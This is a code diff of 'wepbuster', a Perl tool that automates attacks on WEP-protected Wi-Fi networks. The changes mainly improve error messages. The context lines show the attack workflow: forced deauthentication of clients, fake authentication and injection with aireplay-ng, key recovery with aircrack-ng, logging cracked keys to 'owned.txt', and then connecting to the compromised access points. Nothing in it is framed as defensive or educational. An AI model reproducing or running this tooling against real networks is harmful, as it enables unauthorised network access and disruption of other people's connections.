@@ -132,7 +132,7 @@ my $iface_index = 1;
 unless ($inject_iface ne '' && $monitor_iface ne ''){
 print "\nDetecting wireless interfaces...\n";
 my $autodetect_iface = 1;
-open AIRMON, "airmon-ng |" or die $!;
+open AIRMON, "airmon-ng |" or die "Can't run airmon-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
 while (<AIRMON>){
   next unless /^[a-z]+\d\s/;
   next if /^mon\d/;
@@ -202,7 +202,7 @@ $ENV{'inject_iface'} = $inject_iface;
 
 unless (defined $macaddress && $macaddress ne ''){
 
-	open IFCONFIG, "ifconfig $inject_iface |" or die $!;
+	open IFCONFIG, "ifconfig $inject_iface |" or die "Can't run ifconfig.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
 	while (<IFCONFIG>){
 	  next unless /HW/;
 	  $macaddress = (split /\s+/,$_)[-1];
@@ -282,8 +282,8 @@ if (scalar @ARGV > 0 ){
 	if ($mode ne 'sort'){
 	   if ($mode ne 'connect'){
 		print "\nUsage: \n";
-		print "\tperl wepbuster [channel/s] (or any combination, space separated )\n"; 
-		print "\tperl wepbuster (sort | connect) [HOST | IP] 		(Defaults to: gateway)\n";
+		print "\tperl $0 [channel/s] (or any combination, space separated )\n"; 
+		print "\tperl $0 (sort | connect) [HOST | IP] 		(Defaults to: gateway)\n";
 		exit;
 	   }
 	 }
@@ -304,7 +304,7 @@ if (scalar @ARGV > 0 ){
 	unless ($mode eq 'crack'){
 		unless (-e "owned.txt"){
 		
-			  print "\nNothing to $mode. Run \"perl wepbuster\" first.\nExiting...\n\n";
+			  print "\nNothing to $mode. Run \"perl $0\" first.\nExiting...\n\n";
 			  exit;
 		}
 		
@@ -352,7 +352,7 @@ if (scalar @ARGV > 0 ){
 	###  Read the list of cracked APs and store each into %owned_ap (Needed for sort, connect)
 
 	if (-e "owned.txt"){
-	open OWNED, "owned.txt" or die "Can\'t open owned.txt!";
+	open OWNED, "owned.txt" or die "Can\'t open owned.txt!\n\n";
 	  while (<OWNED>){
 		next if /^\s*$/;
 		$owned_ap{(split / === / , $_)[0]} = {
@@ -373,7 +373,7 @@ if (scalar @ARGV > 0 ){
 ### Read the list of bad APs and store each into %bad_ap, so that we can skip cracking an AP if it is included in the list
 
       if (-e "bad_ap.txt"){
-	    open BADAP, "bad_ap.txt" or die "Can\'t open bad_ap.txt!";
+	    open BADAP, "bad_ap.txt" or die "Can\'t open bad_ap.txt!\n\n";
 	    while (<BADAP>){
 		chomp;
 		$_ =~ s/^\s*$//;
@@ -384,10 +384,11 @@ if (scalar @ARGV > 0 ){
 
 ###  Read the list of known APs and store each into %known_ap, so that we can skip cracking an AP unless it is included in the list
 	if (-e "known_ap.txt"){
-		open KNOWNAP, "known_ap.txt" or die "Can\'t open known_ap.txt!";
+		open KNOWNAP, "known_ap.txt" or die "Can\'t open known_ap.txt!\n\n";
 		while (<KNOWNAP>){
 			chomp;
 			$_ =~ s/^\s*$//;
+			$_ =~ tr/a-z/A-Z/;
 			$known_ap{$_} = '';
 		}
 	}
@@ -448,7 +449,7 @@ if (scalar @ARGV > 0 ){
 
 	     die "Could not fork airodump-ng!" unless defined (my $deauthdump_pid = fork);
 	     if ($deauthdump_pid == 0){
-	       `airodump-ng -t wep -d $all_ap{$all_ap_key}->{'bssid'} $monitor_iface -c $all_ap{$all_ap_key}->{'channel'} -w deauth_dump 2>&1`;
+	       `airodump-ng -t wep -d $all_ap{$all_ap_key}->{'bssid'} $monitor_iface -c $all_ap{$all_ap_key}->{'channel'} -n -w deauth_dump 2>&1`;
 	     }
 	     my $hidden_ssid_found = 0;
 	     my $hiddenssid;
@@ -482,7 +483,7 @@ if (scalar @ARGV > 0 ){
 		  `aireplay-ng -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress 2>&1`;
 		}
 		sleep $airodumpwait;
-		open DEAUTHDUMP, "deauth_dump-01.csv" or die $!;
+		open DEAUTHDUMP, "deauth_dump-01.csv" or die "Can't open deauth_dump-01.csv!\n\n";
 		while (<DEAUTHDUMP>){
 		  next if (/^\r$/ || /^BSSID/);
 		  last if (/^Station/);
@@ -566,10 +567,10 @@ print "Checking for mac filtering...";
 
 ### Child fork will write to the parent via PREAUTH_IPC
 
-die "Could not fork aireplay-ng!"  unless defined (my $preauth_pid = open(PREAUTH_IPC, "-|"));
+die "Could not fork aireplay-ng!\n\n"  unless defined (my $preauth_pid = open(PREAUTH_IPC, "-|"));
 
 if ($preauth_pid == 0){
-  open PREAUTH, "aireplay-ng -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \'$all_ap{$all_ap_key}->{'ssid'}\' -h $macaddress 2>&1|" or die $!;
+  open PREAUTH, "aireplay-ng -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \'$all_ap{$all_ap_key}->{'ssid'}\' -h $macaddress 2>&1|" or die "Can't run aireplay-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
   while (<PREAUTH>){
      next if /^\s*$/;
      print;
@@ -617,6 +618,9 @@ while (<PREAUTH_IPC>){
 
  if (/unsuccessful/){
       print "\nCan't associate. aireplay-ng died!\n\n"; 
+      foreach (@preauth){
+	print "\t$_";
+      }
       $auth = 'failed';
       kill(9, $preauth_pid);
       last;
@@ -678,7 +682,7 @@ if (defined $errline){
 	   #################     BEGIN FAKEAUTH FORK    ####################################
 	   die "Could not fork aireplay-ng!" unless defined (my $pid = fork);
 	   if ($pid == 0){
-	      open AIREPLAY, "aireplay-ng -1 6000 -o 1 -q 10 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \'$all_ap{$all_ap_key}->{'ssid'}\' -h $macaddress |" or die $!;
+	      open AIREPLAY, "aireplay-ng -1 6000 -o 1 -q 10 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \'$all_ap{$all_ap_key}->{'ssid'}\' -h $macaddress |" or die "Can't run aireplay-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
 	      my @fakeauth;
 	      while (<AIREPLAY>){
 	      push @fakeauth, $_; 
@@ -753,7 +757,7 @@ if (defined $errline){
 
 	###  Keep watching the contents of airodump output "inject_dump-01.csv" every 1 sleep
 
-	  open INJECTDUMP, "inject_dump-01.csv" or die $!;
+	  open INJECTDUMP, "inject_dump-01.csv" or die "Can't open inject_dump-01.csv!\n\n";
 	  while (<INJECTDUMP>){
 	     next if (/^\r$/ || /^BSSID/);
 	     last if (/^Station/);
@@ -776,7 +780,7 @@ if (defined $errline){
 	       if ($aircrack_pid == 0){
 
 
-	         open AIRCRACK,"aircrack-ng -q -b $all_ap{$all_ap_key}->{'bssid'} inject_dump-01.cap |" or die $!;
+	         open AIRCRACK,"aircrack-ng -q -b $all_ap{$all_ap_key}->{'bssid'} inject_dump-01.cap |" or die "Can't run aircrack-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
 		 while (<AIRCRACK>){
 			chomp;
 			if ($keyfound){
@@ -813,8 +817,8 @@ if (defined $errline){
 	### Make sure the existing key will be replaced with a new one in case 15 days have passed since $dateowned
 
 			if (exists $owned_ap{$all_ap{$all_ap_key}->{'bssid'}}){	
-			  open KEYS, "owned.txt" or die $!;
-			  open KEYSTEMP, ">.owned.txt.tmp" or die $!;
+			  open KEYS, "owned.txt" or die "Can't open owned.txt!\n\n";
+			  open KEYSTEMP, ">.owned.txt.tmp" or die "Can't write to .owned.txt.tmp!\n\n";
 			  while (<KEYS>){
 				chomp;
 				next if /$all_ap{$all_ap_key}->{'bssid'}/;
@@ -823,7 +827,7 @@ if (defined $errline){
 			  `cp .owned.txt.tmp owned.txt`;
 			close KEYS;
 			}
-			open KEYS, ">>owned.txt" or die $!;
+			open KEYS, ">>owned.txt" or die "Can't append to owned.txt!\n\n";
 		         print KEYS "$all_ap{$all_ap_key}->{'bssid'} === $all_ap{$all_ap_key}->{'channel'} === $all_ap{$all_ap_key}->{'ssid'} === $all_ap{$all_ap_key}->{'key'} === $date\n";
 			$keyfound = 1;
 		   }
@@ -1010,9 +1014,7 @@ if ($ivtimer % 10 == 0 || $ivtimer == 1){
      			} 
                  }
 
-	   print "\n\nAll APs have been tried. Cannot connect. Resetting the wireless card...\n";
-	   system ("rmmod r8187");
-	   system ("modprobe r8187");
+	   print "\n\nAll APs have been tried. Cannot connect. Try reloading the wireless card driver.\n";
 	   exit;
 
 #########################   END   MODE  CONNECT  ####################################
@@ -1033,7 +1035,7 @@ if ($mode eq 'sort'){
 my %unsortedap;
 my @outofrange;
 
-open OWNED, "owned.txt" or die $!;
+open OWNED, "owned.txt" or die "Can't open owned.txt!\n\n";
 while (<OWNED>){
    chomp;
    $bssid = (split/ === /, $_)[0];
@@ -1047,8 +1049,8 @@ while (<OWNED>){
 
 }
 
-open SORTEDRTT, ">owned_rtt.txt" or die $!;
-open SORTED, ">owned_sorted.txt" or die $!;
+open SORTEDRTT, ">owned_rtt.txt" or die "Can't write to owned_rtt.txt!\n\n";
+open SORTED, ">owned_sorted.txt" or die "Can't write to owned_sorted.txt!\n\n";
 foreach (sort { $unsortedap{$a} <=> $unsortedap{$b} } keys %unsortedap){
 	print SORTEDRTT "$_ === $unsortedap{$_}\n";
 	print SORTED "$_\n";
@@ -1056,7 +1058,7 @@ foreach (sort { $unsortedap{$a} <=> $unsortedap{$b} } keys %unsortedap){
 close SORTEDRTT;
 close SORTED;
 system "touch owned_sorted.txt" unless (-e 'owned_sorted.txt');
-open SORTED, ">>owned_sorted.txt" or die $!;
+open SORTED, ">>owned_sorted.txt" or die "Can't append to owned_sorted.txt!\n\n";
 foreach (@outofrange){
 	print SORTED "$_\n";
 }
@@ -1097,7 +1099,7 @@ print "Associating...\n";
 `iwconfig $inject_iface key $key`;
 
 sleep 15;
-open IWCONFIG, "iwconfig $inject_iface |" or die $!;
+open IWCONFIG, "iwconfig $inject_iface |" or die "Can't run iwconfig.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
 while (<IWCONFIG>){
   if (/linked/){
 	print "Associated successfully...\n";
@@ -1136,7 +1138,7 @@ while (<IWCONFIG>){
        }else{
 	 print "Getting RTT of $pinghost...\n";
 	}
-      open PING, "ping -q -c 10 $pinghost |" or die $!;
+      open PING, "ping -q -c 10 $pinghost |" or die "Can't run ping.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
       while (<PING>){
         if (/rtt/){
 	  my $rtt = (split/\//, $_)[4];
@@ -1181,7 +1183,7 @@ if ($ping != 0){
 	exit(0);
 	}	
 	waitpid($pid, 0);
-         open NETSTAT, "netstat -rn|" or die $!; 
+         open NETSTAT, "netstat -rn|" or die "Can't run netstat.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n"; 
          while (<NETSTAT>){
            next unless /^0.0.0.0/;
            $gateway = (split/\s+/,$_)[1];
@@ -1341,7 +1343,7 @@ my $atheros = 0;
 my $mac80211 = 0;
 
 
-open AIRMONSTART, "airmon-ng start $inject_iface |" or die $!;
+open AIRMONSTART, "airmon-ng start $inject_iface |" or die "Can't run airmon-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n"; 
 
 while (<AIRMONSTART>){
   if ($monitor_error){
